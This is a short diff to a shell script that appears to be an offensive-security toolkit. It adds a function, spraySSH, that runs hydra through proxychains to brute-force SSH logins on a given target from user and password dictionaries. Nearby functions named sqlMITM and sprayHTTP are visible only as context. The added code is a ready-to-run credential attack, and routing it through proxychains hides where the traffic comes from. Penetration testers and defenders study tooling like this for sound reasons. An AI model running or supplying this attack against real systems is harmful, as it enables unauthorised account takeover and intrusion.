@@ -1978,6 +1978,20 @@ function sqlMITM(){
 
 }
 
+function spraySSH(){
+    # DESCRIPTION: Password spraying attack against SSH.
+    # ARGUMENT: spraySSH TARGET, USERDICTIONARY, PASSWORDDICTIONARY.
+    TARGET=$1;
+    USERDICTIONARY=$2;
+    PASSWORDDICTIONARY=$3;
+    proxychains \
+    hydra -L ${USERDICTIONARY} \
+    -P ${PASSWORDDICTIONARY} \
+    ${TARGET} \
+    ssh -u -V;
+    return;
+}
+
 function sprayHTTP(){
     # DESCRIPTION: Password spraying attack against HTTP.
     # ARGUMENT: sprayHTTP TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
